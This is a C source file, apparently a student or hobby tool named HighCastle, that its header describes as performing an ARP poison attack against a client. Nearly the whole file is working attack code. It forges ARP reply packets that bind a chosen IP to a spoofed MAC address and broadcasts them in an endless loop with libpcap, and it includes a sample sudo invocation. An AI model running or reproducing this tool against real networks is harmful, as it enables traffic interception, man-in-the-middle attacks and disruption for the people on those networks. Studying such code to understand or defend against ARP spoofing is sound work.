/******************************************************
HighCastle.c

Date: October 8, 2018

Author: Joseph Rocha <JosephRocha.CS@gmail.com>

Purpose: This program performs a ARP poison attack
         against a client.

Sample Invocation:
  sudo ./HighCastle <Interface> <Spoof_IP> <Spoof_MAC>
  sudo ./HighCastle eno1 10.10.22.22 94:c6:91:a0:91:8d
******************************************************/
#include <stdio.h>
#include <string.h>
#include <pcap.h>
#include <dnet.h>
#include <netinet/if_ether.h>

typedef struct arp_header{
    u_int16_t htype;    /* Hardware Type           */
    u_int16_t ptype;    /* Protocol Type           */
    u_char hlen;        /* Hardware Address Length */
    u_char plen;        /* Protocol Address Length */
    u_int16_t oper;     /* Operation Code          */
    u_char sha[6];      /* Sender hardware address */
    u_char spa[4];      /* Sender IP address       */
    u_char tha[6];      /* Target hardware address */
    u_char tpa[4];      /* Target IP address       */
}arp_header;

int main(int argc, char **argv){
    char errorBuffer[PCAP_ERRBUF_SIZE];
    pcap_t *handle;
    char packet[1024];
    eth_addr_t ether_address;
    struct addr ip_address;

    handle = pcap_open_live(argv[1], BUFSIZ, 100, 1, errorBuffer);

    /*Set up Ethernet Header */
    struct ether_header* ethhdr = (struct ether_header*) packet;

    eth_pton("00:00:00:00:00:00", &ether_address);
    memcpy(&ethhdr->ether_shost, &ether_address, ETH_ADDR_LEN);

    eth_pton("FF:FF:FF:FF:FF:FF", &ether_address);
    memcpy(&ethhdr->ether_dhost, &ether_address, ETH_ADDR_LEN);

    ethhdr->ether_type = ntohs(ETHERTYPE_ARP);

    /* Set up ARP header */
    struct arp_header* arphdr = (struct arp_header*) (packet + sizeof(struct ether_header));

    arphdr->htype = ntohs(0x01); //Ethernet
    arphdr->ptype =  ntohs(0x0800); //IPv4
    arphdr->hlen = 6;
    arphdr->plen = 4;
    arphdr->oper = ntohs(0x02);

    /* Insert this record into the victim's ARP table. */
    inet_pton(AF_INET, argv[2], &(ip_address.addr_ip));
    memcpy(&arphdr->spa, &ip_address.addr_ip, IP_ADDR_LEN);
    eth_pton(argv[3], &ether_address);
    memcpy(&arphdr->sha, &ether_address, ETH_ADDR_LEN);

    //Eh do I need this?
    inet_pton(AF_INET, "0.0.0.0", &(ip_address.addr_ip));
    memcpy(&arphdr->tpa, &ip_address.addr_ip, IP_ADDR_LEN);
    eth_pton("00:00:00:00:00:00", &ether_address);
    memcpy(&arphdr->tha, &ether_address, ETH_ADDR_LEN);

    /* Send Packet */
    while(1)
        pcap_inject(handle, packet, (sizeof(struct ether_header) + sizeof(struct arp_header)));
}
